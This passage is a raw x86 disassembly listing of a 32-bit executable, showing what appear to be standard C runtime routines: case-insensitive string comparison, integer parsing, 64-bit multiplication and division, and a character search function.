  4288f3:	cmp    al,0x1a
  4288f5:	sbb    cl,cl
  4288f7:	and    cl,0x20
  4288fa:	add    al,cl
  4288fc:	add    al,0x41
  4288fe:	cmp    al,ah
  428900:	je     0x4288d0
  428902:	sbb    al,al
  428904:	sbb    al,0xff
  428906:	movsx  eax,al
  428909:	pop    ebx
  42890a:	pop    esi
  42890b:	pop    edi
  42890c:	leave  
  42890d:	ret    
  42890e:	push   esi
  42890f:	push   edi
  428910:	call   0x425203
  428915:	mov    edi,DWORD PTR [eax+0x64]
  428918:	cmp    edi,DWORD PTR ds:0x45d58c
  42891e:	je     0x428927
  428920:	call   0x4266af
  428925:	mov    edi,eax
  428927:	mov    esi,DWORD PTR [esp+0xc]
  42892b:	cmp    DWORD PTR [edi+0x28],0x1
  42892f:	movzx  eax,BYTE PTR [esi]
  428932:	jle    0x428942
  428934:	push   0x8
  428936:	push   eax
  428937:	push   edi
  428938:	call   0x428996
  42893d:	add    esp,0xc
  428940:	jmp    0x42894c
  428942:	mov    ecx,DWORD PTR [edi+0x48]
  428945:	movzx  eax,BYTE PTR [ecx+eax*2]
  428949:	and    eax,0x8
  42894c:	test   eax,eax
  42894e:	je     0x428953
  428950:	inc    esi
  428951:	jmp    0x42892b
  428953:	movzx  ecx,BYTE PTR [esi]
  428956:	inc    esi
  428957:	cmp    ecx,0x2d
  42895a:	mov    edx,ecx
  42895c:	je     0x428963
  42895e:	cmp    ecx,0x2b
  428961:	jne    0x428967
  428963:	movzx  ecx,BYTE PTR [esi]
  428966:	inc    esi
  428967:	xor    eax,eax
  428969:	cmp    ecx,0x30
  42896c:	jl     0x428978
  42896e:	cmp    ecx,0x39
  428971:	jg     0x428978
  428973:	sub    ecx,0x30
  428976:	jmp    0x42897b
  428978:	or     ecx,0xffffffff
  42897b:	cmp    ecx,0xffffffff
  42897e:	je     0x42898c
  428980:	lea    eax,[eax+eax*4]
  428983:	lea    eax,[ecx+eax*2]
  428986:	movzx  ecx,BYTE PTR [esi]
  428989:	inc    esi
  42898a:	jmp    0x428969
  42898c:	cmp    edx,0x2d
  42898f:	pop    edi
  428990:	pop    esi
  428991:	jne    0x428995
  428993:	neg    eax
  428995:	ret    
  428996:	push   ebp
  428997:	mov    ebp,esp
  428999:	push   ecx
  42899a:	mov    eax,DWORD PTR [ebp+0xc]
  42899d:	lea    ecx,[eax+0x1]
  4289a0:	cmp    ecx,0x100
  4289a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4289a9:	ja     0x4289b4
  4289ab:	mov    ecx,DWORD PTR [ecx+0x48]
  4289ae:	movzx  eax,WORD PTR [ecx+eax*2]
  4289b2:	jmp    0x428a08
  4289b4:	push   esi
  4289b5:	mov    edx,eax
  4289b7:	sar    edx,0x8
  4289ba:	push   edi
  4289bb:	mov    edi,DWORD PTR [ecx+0x48]
  4289be:	movzx  esi,dl
  4289c1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  4289c6:	pop    edi
  4289c7:	pop    esi
  4289c8:	je     0x4289d9
  4289ca:	and    BYTE PTR [ebp-0x2],0x0
  4289ce:	push   0x2
  4289d0:	mov    BYTE PTR [ebp-0x3],al
  4289d3:	mov    BYTE PTR [ebp-0x4],dl
  4289d6:	pop    eax
  4289d7:	jmp    0x4289e3
  4289d9:	and    BYTE PTR [ebp-0x3],0x0
  4289dd:	mov    BYTE PTR [ebp-0x4],al
  4289e0:	xor    eax,eax
  4289e2:	inc    eax
  4289e3:	push   0x1
  4289e5:	push   DWORD PTR [ecx+0x14]
  4289e8:	push   DWORD PTR [ecx+0x4]
  4289eb:	lea    ecx,[ebp+0xe]
  4289ee:	push   ecx
  4289ef:	push   eax
  4289f0:	lea    eax,[ebp-0x4]
  4289f3:	push   eax
  4289f4:	push   0x1
  4289f6:	call   0x427a78
  4289fb:	add    esp,0x1c
  4289fe:	test   eax,eax
  428a00:	jne    0x428a04
  428a02:	leave  
  428a03:	ret    
  428a04:	movzx  eax,WORD PTR [ebp+0xe]
  428a08:	and    eax,DWORD PTR [ebp+0x10]
  428a0b:	leave  
  428a0c:	ret    
  428a0d:	int3   
  428a0e:	int3   
  428a0f:	int3   
  428a10:	mov    eax,DWORD PTR [esp+0x8]
  428a14:	mov    ecx,DWORD PTR [esp+0x10]
  428a18:	or     ecx,eax
  428a1a:	mov    ecx,DWORD PTR [esp+0xc]
  428a1e:	jne    0x428a29
  428a20:	mov    eax,DWORD PTR [esp+0x4]
  428a24:	mul    ecx
  428a26:	ret    0x10
  428a29:	push   ebx
  428a2a:	mul    ecx
  428a2c:	mov    ebx,eax
  428a2e:	mov    eax,DWORD PTR [esp+0x8]
  428a32:	mul    DWORD PTR [esp+0x14]
  428a36:	add    ebx,eax
  428a38:	mov    eax,DWORD PTR [esp+0x8]
  428a3c:	mul    ecx
  428a3e:	add    edx,ebx
  428a40:	pop    ebx
  428a41:	ret    0x10
  428a44:	int3   
  428a45:	int3   
  428a46:	int3   
  428a47:	int3   
  428a48:	int3   
  428a49:	int3   
  428a4a:	int3   
  428a4b:	int3   
  428a4c:	int3   
  428a4d:	int3   
  428a4e:	int3   
  428a4f:	int3   
  428a50:	push   ebp
  428a51:	mov    ebp,esp
  428a53:	push   edi
  428a54:	push   esi
  428a55:	push   ebx
  428a56:	mov    ecx,DWORD PTR [ebp+0x10]
  428a59:	or     ecx,ecx
  428a5b:	je     0x428aaa
  428a5d:	mov    esi,DWORD PTR [ebp+0x8]
  428a60:	mov    edi,DWORD PTR [ebp+0xc]
  428a63:	mov    bh,0x41
  428a65:	mov    bl,0x5a
  428a67:	mov    dh,0x20
  428a69:	lea    ecx,[ecx+0x0]
  428a6c:	mov    ah,BYTE PTR [esi]
  428a6e:	or     ah,ah
  428a70:	mov    al,BYTE PTR [edi]
  428a72:	je     0x428a9b
  428a74:	or     al,al
  428a76:	je     0x428a9b
  428a78:	add    esi,0x1
  428a7b:	add    edi,0x1
  428a7e:	cmp    ah,bh
  428a80:	jb     0x428a88
  428a82:	cmp    ah,bl
  428a84:	ja     0x428a88
  428a86:	add    ah,dh
  428a88:	cmp    al,bh
  428a8a:	jb     0x428a92
  428a8c:	cmp    al,bl
  428a8e:	ja     0x428a92
  428a90:	add    al,dh
  428a92:	cmp    ah,al
  428a94:	jne    0x428aa1
  428a96:	sub    ecx,0x1
  428a99:	jne    0x428a6c
  428a9b:	xor    ecx,ecx
  428a9d:	cmp    ah,al
  428a9f:	je     0x428aaa
  428aa1:	mov    ecx,0xffffffff
  428aa6:	jb     0x428aaa
  428aa8:	neg    ecx
  428aaa:	mov    eax,ecx
  428aac:	pop    ebx
  428aad:	pop    esi
  428aae:	pop    edi
  428aaf:	leave  
  428ab0:	ret    
  428ab1:	int3   
  428ab2:	int3   
  428ab3:	int3   
  428ab4:	int3   
  428ab5:	int3   
  428ab6:	int3   
  428ab7:	int3   
  428ab8:	int3   
  428ab9:	int3   
  428aba:	int3   
  428abb:	int3   
  428abc:	int3   
  428abd:	int3   
  428abe:	int3   
  428abf:	int3   
  428ac0:	push   esi
  428ac1:	mov    eax,DWORD PTR [esp+0x14]
  428ac5:	or     eax,eax
  428ac7:	jne    0x428af1
  428ac9:	mov    ecx,DWORD PTR [esp+0x10]
  428acd:	mov    eax,DWORD PTR [esp+0xc]
  428ad1:	xor    edx,edx
  428ad3:	div    ecx
  428ad5:	mov    ebx,eax
  428ad7:	mov    eax,DWORD PTR [esp+0x8]
  428adb:	div    ecx
  428add:	mov    esi,eax
  428adf:	mov    eax,ebx
  428ae1:	mul    DWORD PTR [esp+0x10]
  428ae5:	mov    ecx,eax
  428ae7:	mov    eax,esi
  428ae9:	mul    DWORD PTR [esp+0x10]
  428aed:	add    edx,ecx
  428aef:	jmp    0x428b38
  428af1:	mov    ecx,eax
  428af3:	mov    ebx,DWORD PTR [esp+0x10]
  428af7:	mov    edx,DWORD PTR [esp+0xc]
  428afb:	mov    eax,DWORD PTR [esp+0x8]
  428aff:	shr    ecx,1
  428b01:	rcr    ebx,1
  428b03:	shr    edx,1
  428b05:	rcr    eax,1
  428b07:	or     ecx,ecx
  428b09:	jne    0x428aff
  428b0b:	div    ebx
  428b0d:	mov    esi,eax
  428b0f:	mul    DWORD PTR [esp+0x14]
  428b13:	mov    ecx,eax
  428b15:	mov    eax,DWORD PTR [esp+0x10]
  428b19:	mul    esi
  428b1b:	add    edx,ecx
  428b1d:	jb     0x428b2d
  428b1f:	cmp    edx,DWORD PTR [esp+0xc]
  428b23:	ja     0x428b2d
  428b25:	jb     0x428b36
  428b27:	cmp    eax,DWORD PTR [esp+0x8]
  428b2b:	jbe    0x428b36
  428b2d:	dec    esi
  428b2e:	sub    eax,DWORD PTR [esp+0x10]
  428b32:	sbb    edx,DWORD PTR [esp+0x14]
  428b36:	xor    ebx,ebx
  428b38:	sub    eax,DWORD PTR [esp+0x8]
  428b3c:	sbb    edx,DWORD PTR [esp+0xc]
  428b40:	neg    edx
  428b42:	neg    eax
  428b44:	sbb    edx,0x0
  428b47:	mov    ecx,edx
  428b49:	mov    edx,ebx
  428b4b:	mov    ebx,ecx
  428b4d:	mov    ecx,eax
  428b4f:	mov    eax,esi
  428b51:	pop    esi
  428b52:	ret    0x10
  428b55:	int3   
  428b56:	int3   
  428b57:	int3   
  428b58:	int3   
  428b59:	int3   
  428b5a:	int3   
  428b5b:	int3   
  428b5c:	int3   
  428b5d:	int3   
  428b5e:	int3   
  428b5f:	int3   
  428b60:	lea    eax,[edx-0x1]
  428b63:	pop    ebx
  428b64:	ret    
  428b65:	lea    esp,[esp+0x0]
  428b6c:	lea    esp,[esp+0x0]
  428b70:	xor    eax,eax
  428b72:	mov    al,BYTE PTR [esp+0x8]
  428b76:	push   ebx
  428b77:	mov    ebx,eax
  428b79:	shl    eax,0x8
  428b7c:	mov    edx,DWORD PTR [esp+0x8]
  428b80:	test   edx,0x3
  428b86:	je     0x428b9d
  428b88:	mov    cl,BYTE PTR [edx]
  428b8a:	add    edx,0x1
  428b8d:	cmp    cl,bl
  428b8f:	je     0x428b60
  428b91:	test   cl,cl
  428b93:	je     0x428be6
  428b95:	test   edx,0x3
  428b9b:	jne    0x428b88
  428b9d:	or     ebx,eax
  428b9f:	push   edi
  428ba0:	mov    eax,ebx
  428ba2:	shl    ebx,0x10
  428ba5:	push   esi
  428ba6:	or     ebx,eax
  428ba8:	mov    ecx,DWORD PTR [edx]
  428baa:	mov    edi,0x7efefeff
  428baf:	mov    eax,ecx
  428bb1:	mov    esi,edi
  428bb3:	xor    ecx,ebx
  428bb5:	add    esi,eax
  428bb7:	add    edi,ecx
  428bb9:	xor    ecx,0xffffffff
  428bbc:	xor    eax,0xffffffff
  428bbf:	xor    ecx,edi
  428bc1:	xor    eax,esi
  428bc3:	add    edx,0x4
  428bc6:	and    ecx,0x81010100
  428bcc:	jne    0x428bea
  428bce:	and    eax,0x81010100
  428bd3:	je     0x428ba8
  428bd5:	and    eax,0x1010100
  428bda:	jne    0x428be4
  428bdc:	and    esi,0x80000000
  428be2:	jne    0x428ba8
  428be4:	pop    esi
  428be5:	pop    edi
  428be6:	pop    ebx
  428be7:	xor    eax,eax
  428be9:	ret    
  428bea:	mov    eax,DWORD PTR [edx-0x4]
  428bed:	cmp    al,bl
  428bef:	je     0x428c27
  428bf1:	test   al,al
  428bf3:	je     0x428be4
  428bf5:	cmp    ah,bl
  428bf7:	je     0x428c20
  428bf9:	test   ah,ah
  428bfb:	je     0x428be4
  428bfd:	shr    eax,0x10
  428c00:	cmp    al,bl
  428c02:	je     0x428c19
  428c04:	test   al,al
  428c06:	je     0x428be4
  428c08:	cmp    ah,bl
  428c0a:	je     0x428c12
  428c0c:	test   ah,ah
  428c0e:	je     0x428be4
  428c10:	jmp    0x428ba8
  428c12:	pop    esi
  428c13:	pop    edi
  428c14:	lea    eax,[edx-0x1]
  428c17:	pop    ebx
  428c18:	ret    
  428c19:	lea    eax,[edx-0x2]
  428c1c:	pop    esi
  428c1d:	pop    edi
  428c1e:	pop    ebx
  428c1f:	ret    
  428c20:	lea    eax,[edx-0x3]
  428c23:	pop    esi
  428c24:	pop    edi
  428c25:	pop    ebx
  428c26:	ret    
  428c27:	lea    eax,[edx-0x4]
  428c2a:	pop    esi
  428c2b:	pop    edi
  428c2c:	pop    ebx
  428c2d:	ret    
  428c2e:	jmp    DWORD PTR ds:0x429104
